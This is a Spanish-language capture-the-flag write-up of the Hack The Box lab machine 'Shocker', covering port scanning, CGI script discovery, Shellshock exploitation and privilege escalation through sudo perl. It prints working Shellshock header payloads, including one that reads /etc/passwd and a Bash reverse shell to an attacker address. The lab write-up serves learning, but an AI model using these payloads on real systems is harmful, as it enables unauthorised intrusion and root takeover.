Resumen

El nombre no deja mucho a la imaginación: Shocker va de Shellshock, el fallo de Bash de 2014. Lo bonito de esta máquina es que hay que encontrar primero el script CGI, que no está enlazado en ninguna parte.

Reconocimiento

┌──(jaime㉿kali)-[~]└─$ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.56

2 puertos a la escucha:

PuertoServicioVersión
80httpApache httpd 2.4.18
2222sshOpenSSH 7.2p2

El SSH en un puerto no estándar es llamativo, pero sin credenciales no sirve de nada. La web es una única página con una imagen de un bug y nada más.

Enumeración

Fuzzing de directorios sobre el puerto 80:

┌──(jaime㉿kali)-[~]└─$ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirb/common.txt
/cgi-bin/ (Status: 403)

/cgi-bin/, el directorio estándar de Apache para scripts que se ejecutan por la Common Gateway Interface. Devuelve 403, así que no puedo listarlo, pero sí adivinar nombres de archivo. Vuelvo a fuzzear dentro, esta vez probando extensiones de script:

┌──(jaime㉿kali)-[~]└─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,pl,cgi,py
/user.sh (Status: 200)

Ahí está: user.sh. Lo pido y descarga un archivo de texto:

┌──(jaime㉿kali)-[~]└─$ curl http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain Just an uptime test script 09:12:45 up 1:04, 0 users, load average: 0.00, 0.01, 0.05

Esa salida es literalmente la del comando uptime. Es decir: un script en Bash que ejecuta comandos del sistema a través de CGI.

Script CGI + Bash = candidato inmediato a Shellshock. Es lo que hay que comprobar siempre que aparece un /cgi-bin/.

Explotación

CVE-2014-6271, conocido como Shellshock, es un fallo en cómo Bash procesa las variables de entorno. Bash importaba funciones definidas en variables con el formato () { :; }; y, por error, seguía ejecutando lo que viniera detrás de la definición.

Cuando Apache invoca un script CGI, vuelca las cabeceras HTTP en variables de entorno: el User-Agent acaba en HTTP_USER_AGENT. Si el script es Bash, basta con enviar la carga en una cabecera.

Lo verifico con curl:

┌──(jaime㉿kali)-[~]└─$ curl -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd" http://10.10.10.56/cgi-bin/user.sh
root:x:0:0:root:/root:/bin/bash ... shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash

Ejecución de comandos confirmada, y de paso aparece el usuario shelly. Ahora una shell inversa:

┌──(jaime㉿kali)-[~]└─$ nc -lvnp 443
┌──(jaime㉿kali)-[~]└─$ curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.X/443 0>&1" http://10.10.10.56/cgi-bin/user.sh
shelly@Shocker:/usr/lib/cgi-bin$ whoami shelly

El servidor web corre como shelly, no como www-data, que ya es un detalle de configuración cuestionable.

También existe el módulo exploit/multi/http/apache_mod_cgi_bash_env_exec de Metasploit, que automatiza exactamente esto.

Escalada de privilegios

Primera parada de siempre:

shelly@Shocker:~$ sudo -l
User shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perl

perl como root y sin contraseña. Perl puede ejecutar comandos arbitrarios, así que esto es equivalente a dar una shell de root:

shelly@Shocker:~$ sudo perl -e 'exec "/bin/bash";' root@Shocker:~# whoami root

Flags

shelly@Shocker:~$ cat /home/shelly/user.txt root@Shocker:~# cat /root/root.txt

Conclusiones

  • Shellshock tiene más de diez años, pero sigue apareciendo en sistemas antiguos con CGI. Si ves /cgi-bin/, pruébalo.
  • Un 403 en un directorio no es un callejón sin salida: significa que no puedes listarlo, no que no puedas acceder a lo que hay dentro. Fuzzea con extensiones.
  • Dar sudo sobre un intérprete (perl, python, awk, vim, find…) es dar root directamente. GTFOBins recoge cómo escapar de cada binario.
  • sudo -l es el primer comando tras conseguir cualquier shell en Linux.
